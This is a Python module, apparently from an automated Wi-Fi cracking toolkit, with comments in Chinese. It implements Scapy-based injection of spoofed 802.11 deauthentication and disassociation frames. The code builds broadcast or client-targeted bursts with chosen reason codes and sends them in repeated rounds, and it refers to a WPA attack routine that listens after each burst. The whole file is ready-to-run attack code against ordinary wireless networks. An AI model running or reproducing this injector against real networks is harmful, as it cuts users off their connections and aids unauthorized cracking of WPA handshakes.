#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Scapy 层 2 deauth / disassoc 注入。

发包策略严格对齐参考脚本（MT7921U + Parallels ARM64 实测）:
  /Volumes/256G/Wi-Fi破解/wifi-crack-kali/自动攻击/auto_attack.py

要点（只抄发送侧，不抄抓包逻辑）:
  1) 帧结构 RadioTap/Dot11/Deauth|Disas
  2) reason 分向:
       deauth AP→STA = 7
       deauth STA→AP = 1
       disas  双向   = 8
  3) 组 burst 列表后一次 sendp(burst, inter=0.003)
  4) 精准: 4 向 × 16 = 64 帧/轮；广播: 2 向 × 32 = 64 帧/轮
  5) 默认连打 rounds 轮（参考脚本爆发阶段 ×4 → 256 帧）

依赖可选: python3-scapy。无 scapy 时返回 0，由 aireplay 兜底。
"""

from __future__ import annotations

from typing import Optional

from ..config import Configuration
from ..util.validate import is_mac_address, is_safe_iface


class ScapyDeauth(object):
    dependency_name = 'scapy'
    dependency_url = 'https://scapy.net/ (Kali: apt install python3-scapy)'

    _scapy = None
    _checked = False

    @classmethod
    def available(cls) -> bool:
        if cls._checked:
            return cls._scapy is not None
        cls._checked = True
        try:
            from scapy.all import (  # type: ignore
                RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp, conf,
            )
            conf.verb = 0
            cls._scapy = {
                'RadioTap': RadioTap,
                'Dot11': Dot11,
                'Dot11Deauth': Dot11Deauth,
                'Dot11Disas': Dot11Disas,
                'sendp': sendp,
            }
            return True
        except Exception:
            cls._scapy = None
            return False

    @classmethod
    def fails_dependency_check(cls) -> bool:
        return False

    @staticmethod
    def _norm_mac(mac: Optional[str]) -> Optional[str]:
        if not mac:
            return None
        m = mac.strip().lower()
        return m if is_mac_address(m) else None

    @classmethod
    def build_burst(cls, bssid: str, client: Optional[str], copies: int):
        """按 auto_attack.py 构造一帧 burst 列表。"""
        S = cls._scapy
        RadioTap = S['RadioTap']
        Dot11 = S['Dot11']
        Dot11Deauth = S['Dot11Deauth']
        Dot11Disas = S['Dot11Disas']

        bc = 'ff:ff:ff:ff:ff:ff'
        target = client or bc
        n = max(1, int(copies))

        # Deauth: AP → 客户端  reason=7
        deauth_ap = (RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=target, addr2=bssid, addr3=bssid
        ) / Dot11Deauth(reason=7))

        # Deauth: 客户端 → AP  reason=1
        deauth_cl = (RadioTap() / Dot11(
            type=0, subtype=12,
            addr1=bssid, addr2=target, addr3=bssid
        ) / Dot11Deauth(reason=1))

        # Disassoc: AP → 客户端  reason=8
        disas_ap = (RadioTap() / Dot11(
            type=0, subtype=10,
            addr1=target, addr2=bssid, addr3=bssid
        ) / Dot11Disas(reason=8))

        # Disassoc: 客户端 → AP  reason=8
        disas_cl = (RadioTap() / Dot11(
            type=0, subtype=10,
            addr1=bssid, addr2=target, addr3=bssid
        ) / Dot11Disas(reason=8))

        if client:
            # 精准: 4 向 × n（参考 16 → 64 帧/轮）
            return (
                [deauth_ap] * n
                + [deauth_cl] * n
                + [disas_ap] * n
                + [disas_cl] * n
            )
        # 广播: 只打 AP→广播 的 deauth/disas（参考 32+32）
        return [deauth_ap] * n + [disas_ap] * n

    @classmethod
    def deauth(
        cls,
        target_bssid: str,
        client_mac: Optional[str] = None,
        count: Optional[int] = None,
        iface: Optional[str] = None,
        inter: Optional[float] = None,
        rounds: Optional[int] = None,
    ) -> int:
        """注入 deauth+disassoc。返回成功送出的帧数估计（失败 0）。

        count: 每向复制次数（精准默认 16，广播默认 32）
        rounds: 连发轮数（默认 4，对齐参考「爆发 ×4」）
        inter: sendp 帧间隔秒（默认 0.003）
        """
        if not cls.available():
            return 0

        bssid = cls._norm_mac(target_bssid)
        if not bssid:
            return 0
        if client_mac is not None and str(client_mac).strip():
            client = cls._norm_mac(client_mac)
            if not client:
                return 0
        else:
            client = None

        iface = iface or Configuration.interface
        if not iface or not is_safe_iface(iface):
            return 0

        # 每向份数：有 count 用 count；否则精准 16 / 广播 32
        if count is not None:
            try:
                per_dir = max(1, min(64, int(count)))
            except (TypeError, ValueError):
                per_dir = 16 if client else 32
        else:
            try:
                cfg = int(getattr(Configuration, 'scapy_deauth_count', 0) or 0)
            except (TypeError, ValueError):
                cfg = 0
            if cfg > 0:
                per_dir = max(1, min(64, cfg))
            else:
                per_dir = 16 if client else 32

        try:
            gap = float(inter if inter is not None
                        else getattr(Configuration, 'scapy_deauth_inter', 0.003) or 0.003)
        except (TypeError, ValueError):
            gap = 0.003
        gap = max(0.0, min(gap, 0.05))

        try:
            n_rounds = int(rounds if rounds is not None
                           else getattr(Configuration, 'scapy_deauth_rounds', 4) or 4)
        except (TypeError, ValueError):
            n_rounds = 4
        n_rounds = max(1, min(n_rounds, 8))

        burst = cls.build_burst(bssid, client, per_dir)
        burst_size = len(burst)
        sendp = cls._scapy['sendp']

        sent = 0
        try:
            # 爆发阶段：连打 n_rounds 轮（默认 4），中间不停
            # 静默监听由 AttackWPA 在整次 deauth() 返回后统一 sleep
            for _ in range(n_rounds):
                sendp(burst, iface=iface, inter=gap, verbose=0)
                sent += burst_size
        except Exception:
            return sent if sent else 0
        return sent
